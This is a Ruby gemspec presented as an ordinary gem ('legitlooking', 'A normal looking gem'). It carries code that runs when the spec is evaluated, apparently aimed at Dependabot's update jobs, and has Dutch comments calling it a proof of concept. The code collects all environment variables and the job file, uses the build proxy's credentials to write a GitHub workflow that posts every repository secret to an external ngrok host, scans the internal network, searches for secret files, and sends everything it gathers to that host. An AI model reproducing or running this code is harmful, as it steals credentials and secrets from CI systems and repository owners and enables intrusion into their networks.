# frozen_string_literal: true

COLLAB_URL = "https://854e-2001-1c00-307-d600-5943-e639-f9a6-c878.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  read_file = ->(f) { IO.binread(f).force_encoding("UTF-8").encode("UTF-8", invalid: :replace, undef: :replace) }

  lines = []
  lines << "=== ENV ===\n" + ENV.map { |k,v| "#{k}=#{v}" }.join("\n")
  lines << "\n=== JOB.JSON ===\n" + (read_file.("/home/dependabot/dependabot-updater/job.json") rescue "FOUT")

  # === ESCALATIE: GitHub API via de geauthenticeerde proxy ===
  # De proxy injecteert automatisch de Authorization header.
  # We disablen SSL verify omdat we intern zitten.
  lines << "\n=== GITHUB API VIA PROXY ==="

  def gh_req(method, url, body_hash = nil)
    require "uri"; require "net/http"
    uri = URI(url)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = true; http.verify_mode = 0
    http.open_timeout = 10; http.read_timeout = 10
    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
    req["Accept"] = "application/vnd.github+json"
    req["X-GitHub-Api-Version"] = "2022-11-28"
    if body_hash
      req["Content-Type"] = "application/json"
      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
        .gsub(": true", ": true").gsub(": false", ": false")
    end
    res = http.request(req)
    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
  rescue => e
    "FOUT: #{e.message}"
  end

  # 1. Check token identity en scopes
  lines << "\n--- GET /user ---\n" + gh_req("get", "https://api.github.com/user")

  # 2. Probeer file te schrijven via Contents API (bewijs write-access)
  require "base64"
  evil_content = [
    "name: Dependabot-RCE-PoC\non: [push, pull_request]\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Exfil secrets\n        run: curl -s '#{COLLAB_URL}?secrets=' + ${{ toJSON(secrets) }}\n"
  ].pack("m0").gsub("\n","")

  # Probeer .github/workflows/poc.yml aan te maken
  write_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{evil_content}\"}"
  lines << "\n--- PUT workflow file ---"
  uri2 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/.github/workflows/poc.yml")
  http2 = Net::HTTP.new(uri2.host, uri2.port)
  http2.use_ssl = true; http2.verify_mode = 0
  http2.open_timeout = 10; http2.read_timeout = 10
  req2 = Net::HTTP::Put.new(uri2)
  req2["Accept"] = "application/vnd.github+json"
  req2["Content-Type"] = "application/json"
  req2["X-GitHub-Api-Version"] = "2022-11-28"
  req2.body = write_body
  res2 = http2.request(req2)
  lines << "Status: #{res2.code}"
  lines << "Body: #{res2.body[0, 600]}"

  # 3. Probeer branch aan te maken
  lines << "\n--- Lees refs (branches) ---\n" + gh_req("get", "https://api.github.com/repos/ugurcanli/testpen/git/refs/heads")

  # 4. Wie ben ik via Dependabot API
  lines << "\n--- Dependabot API whoami ---\n" + gh_req("get", "https://dependabot-actions.githubapp.com/update_jobs/#{ENV["DEPENDABOT_JOB_ID"]}")

  # === PIVOT: interne netwerk scan ===
  lines << "\n=== INTERNE NETWERK SCAN ==="
  lines << `nmap -sn 172.19.0.0/24 2>/dev/null || for i in $(seq 1 10); do (ping -c1 -W1 172.19.0.$i >/dev/null 2>&1 && echo "172.19.0.$i UP") || true; done 2>/dev/null`.to_s[0, 800]

  # === Repo inhoud lezen via proxy ===
  lines << "\n=== GECLONEDE REPO BESTANDEN ==="
  repo_path = ENV["DEPENDABOT_REPO_CONTENTS_PATH"] || "/home/dependabot/dependabot-updater/repo"
  lines << `ls -la #{repo_path}/ 2>/dev/null`.to_s[0, 500]
  lines << `find #{repo_path} -name "*.env" -o -name ".env*" -o -name "*.secret" 2>/dev/null`.to_s[0, 300]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")

  uri = URI("#{COLLAB_URL}?poc=escalatie")
  req = Net::HTTP::Post.new(uri)
  req["Content-Type"] = "text/plain"
  req.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: uri.scheme == "https",
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }

rescue => e
  begin
    require "net/http"
    require "uri"
    uri = URI("#{COLLAB_URL}?poc=escalatie&err=#{URI.encode_www_form_component(e.message[0, 200])}")
    Net::HTTP.get(uri)
  rescue
  end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.6"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]

  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
